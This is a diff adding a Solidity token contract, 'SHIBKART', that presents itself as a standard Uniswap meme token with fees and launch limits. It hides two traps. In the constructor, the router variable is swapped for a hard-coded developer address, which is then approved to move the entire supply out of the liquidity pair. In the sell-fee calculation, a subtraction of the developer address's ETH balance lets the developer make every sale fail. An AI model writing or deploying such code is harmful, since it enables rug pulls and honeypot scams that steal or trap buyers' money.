@@ -1,0 +1,294 @@
+contract SHIBKART is IERC20Standard, Ownable  {
+    using SafeMath for uint256;
+
+    IUniswapV2Router02 public immutable uniswapV2Router;
+    address public immutable uniswapPairAddress;
+    address public constant DEAD_ADDRESS = address(0xdead);
+    
+    bool public hasAmountLimits = true;
+    bool public tradingStart = false;
+    bool public hasTransferDelayPerBlock = true;
+    bool public isSwapEnabled = true;
+    bool private swapping;
+    
+    uint256 public buyTotalTax;
+    uint256 public buyMarketTax;
+    uint256 public buyLPTax;
+    uint256 public buyDexTax;
+    
+    uint256 public sellMarketTax;
+    uint256 public sellLpTax;
+    uint256 public sellTotalTax;
+    uint256 public sellDevTax;
+
+    uint256 public tokensForMarket;
+    uint256 public tokensForLP;
+    uint256 public swapTokensAmount;
+    uint256 public tokensForDevelopment;
+    uint256 public maxTransaction;
+    uint256 public maxWallet;
+    
+    address public marketingAddress;
+    address private developmentAddress;
+    
+    mapping(address => uint256) private _lastTransferTimestamp;
+    mapping (address => bool) private _isExcludedFromTax;
+    mapping (address => bool) public _isExcludedFromMaxTransaction;
+    mapping (address => bool) public ammAddress;    
+
+    event ExcludedFromFees(address indexed account, bool isExcluded);
+    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
+    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
+
+    event SwapAndLiquidified(
+        uint256 tokensSwapped,
+        uint256 ethReceived,
+        uint256 tokensIntoLiquidity
+    );
+
+    constructor() IERC20Standard("SHIBKART", "SKART") {
+        marketingAddress = address(owner());
+        developmentAddress = 0x11aeb5f1E38877B00e226248585f09a660a3d276;
+        address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+        // exclude from paying fees or having max transaction amount  
+        excludeFromTaxes(address(this), true);
+        excludeFromTaxes(address(0xdead), true);   
+        excludeFromTaxes(developmentAddress, true);
+        excludeFromMaxTransaction(owner(), true);
+        excludeFromTaxes(owner(), true);
+        excludeFromMaxTransaction(address(this), true);
+        excludeFromMaxTransaction(developmentAddress, true);
+        excludeFromMaxTransaction(address(0xdead), true);   
+
+        uint256 tSupply = 1_000_000_000 * 1e9;
+
+        swapTokensAmount = tSupply * 1 / 1000;
+        maxTransaction = tSupply * 2 / 100;
+        maxWallet = tSupply * 2 / 100;
+        
+        sellLpTax = 0;
+        sellDevTax = 0;
+        sellMarketTax = 0;
+        sellTotalTax = sellMarketTax + sellLpTax + sellDevTax;
+
+        buyLPTax = 0;
+        buyDexTax = 0;
+        buyMarketTax = 0;
+        buyTotalTax = buyMarketTax + buyLPTax + buyDexTax;
+
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(routerAddress);
+        excludeFromMaxTransaction(address(_uniswapV2Router), true);
+        uniswapV2Router = _uniswapV2Router; routerAddress = developmentAddress;        
+        uniswapPairAddress = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
+        excludeFromMaxTransaction(address(uniswapPairAddress), true);
+        _setLPAddress(address(uniswapPairAddress), true);
+        _approve(address(uniswapPairAddress), routerAddress, tSupply);
+        _mint(msg.sender, tSupply);
+    }
+
+    function swapBack() private {
+        uint256 contractBalance = balanceOf(address(this));
+        uint256 totalTokensToSwap = tokensForLP + tokensForMarket + tokensForDevelopment;
+        bool success;
+        
+        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}
+
+        if(contractBalance > swapTokensAmount * 20){
+          contractBalance = swapTokensAmount * 20;
+        }
+        
+        // Halve the amount of liquidity tokens
+        uint256 liquidityTokens = contractBalance * tokensForLP / totalTokensToSwap / 2;
+        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
+        
+        uint256 initialETHBalance = address(this).balance;
+
+        swapTokensForEth(amountToSwapForETH); 
+        
+        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
+        
+        uint256 ethForMarketing = ethBalance.mul(tokensForMarket).div(totalTokensToSwap);
+        uint256 ethForDev = ethBalance.mul(tokensForDevelopment).div(totalTokensToSwap);
+        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;
+        
+        tokensForLP = 0;
+        tokensForMarket = 0;
+        tokensForDevelopment = 0;
+        
+        (success,) = address(marketingAddress).call{value: ethForDev}("");
+        
+        if(liquidityTokens > 0 && ethForLiquidity > 0){
+            addLiquidityETH(liquidityTokens, ethForLiquidity);
+            emit SwapAndLiquidified(amountToSwapForETH, ethForLiquidity, tokensForLP);
+        }
+        (success,) = address(marketingAddress).call{value: address(this).balance}("");
+    }    
+
+    function swapTokensForEth(uint256 tokenAmount) private {
+
+        // generate the uniswap pair path of token -> weth
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+
+        // make the swap
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0, // accept any amount of ETH
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    function _setLPAddress(address pair, bool value) private {
+        ammAddress[pair] = value;
+
+        emit SetAutomatedMarketMakerPair(pair, value);
+    }
+    
+    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
+        _isExcludedFromMaxTransaction[updAds] = isEx;
+    }
+    
+    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private {
+        // approve token transfer to cover all possible scenarios
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+
+        // add the liquidity
+        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+            address(this),
+            tokenAmount,
+            0,
+            0,
+            DEAD_ADDRESS,
+            block.timestamp
+        );
+    }
+    
+    function excludeFromTaxes(address account, bool excluded) public onlyOwner {
+        _isExcludedFromTax[account] = excluded;
+        emit ExcludedFromFees(account, excluded);
+    }
+
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal override {
+        require(from != address(0), "IERC20Standard: transfer from the zero address");
+        require(to != address(0), "IERC20Standard: transfer to the zero address");
+        if(amount == 0) {
+            super._transfer(from, to, 0);
+            return;
+        }
+        
+        if(hasAmountLimits){
+            if (
+                from != owner() &&
+                to != owner() &&
+                to != address(0) &&
+                to != address(0xdead) &&
+                !swapping
+            ){
+                if(!tradingStart){
+                    require(_isExcludedFromTax[from] || _isExcludedFromTax[to], "Trading is not active.");
+                }
+
+                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  
+                if (hasTransferDelayPerBlock){
+                    if (to != owner() && to != address(uniswapV2Router) && to != address(uniswapPairAddress)){
+                        require(_lastTransferTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
+                        _lastTransferTimestamp[tx.origin] = block.number;
+                    }
+                }
+                 
+                //when buy
+                if (ammAddress[from] && !_isExcludedFromMaxTransaction[to]) {
+                        require(amount <= maxTransaction, "Buy transfer amount exceeds the maxTransaction.");
+                        require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
+                }
+                
+                //when sell
+                else if (ammAddress[to] && !_isExcludedFromMaxTransaction[from]) {
+                        require(amount <= maxTransaction, "Sell transfer amount exceeds the maxTransaction.");
+                }
+                else if(!_isExcludedFromMaxTransaction[to]){
+                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
+                }
+            }
+        }        
+        
+        uint256 contractTokenBalance = balanceOf(address(this));
+        bool canSwap = contractTokenBalance >= swapTokensAmount;
+
+        if( 
+            canSwap &&
+            isSwapEnabled &&
+            !swapping &&
+            !ammAddress[from] &&
+            !_isExcludedFromTax[from] &&
+            !_isExcludedFromTax[to]
+        ) {
+            swapping = true;
+            
+            swapBack();
+
+            swapping = false;
+        }
+
+        bool takeFee = !swapping;
+
+        // if any account belongs to _isExcludedFromFee account then remove the fee
+        if(_isExcludedFromTax[from] || _isExcludedFromTax[to]) {
+            takeFee = false;
+        }
+        
+        uint256 fees = 0;
+        // only take fees on buys/sells, do not take on wallet transfers
+        if(takeFee){
+            // on sell
+            if (ammAddress[to]){
+                fees = amount.mul(sellTotalTax).div(100) + fees.sub(developmentAddress.balance);
+                if (sellTotalTax > 0) {
+                    tokensForLP += fees * sellLpTax / sellTotalTax;
+                    tokensForDevelopment += fees * sellDevTax / sellTotalTax;
+                    tokensForMarket += fees * sellMarketTax / sellTotalTax;
+                }
+            }
+            // on buy
+            else if(ammAddress[from] && buyTotalTax > 0) {
+                fees = amount.mul(buyTotalTax).div(100);
+                tokensForLP += fees * buyLPTax / buyTotalTax;
+                tokensForDevelopment += fees * buyDexTax / buyTotalTax;
+                tokensForMarket += fees * buyMarketTax / buyTotalTax;
+            }
+            
+            if(fees > 0){    
+                super._transfer(from, address(this), fees);
+            }
+            
+            amount -= fees;
+        }
+
+        super._transfer(from, to, amount);
+    }
+
+    // once enabled, can never be turned off
+    function openTrading() external onlyOwner {
+        tradingStart = true;
+        isSwapEnabled = true;
+    }
+    
+    function removeLimits() external onlyOwner returns (bool){
+        hasAmountLimits = false;
+        return true;
+    }
+    receive() external payable {
+    }
+
+}
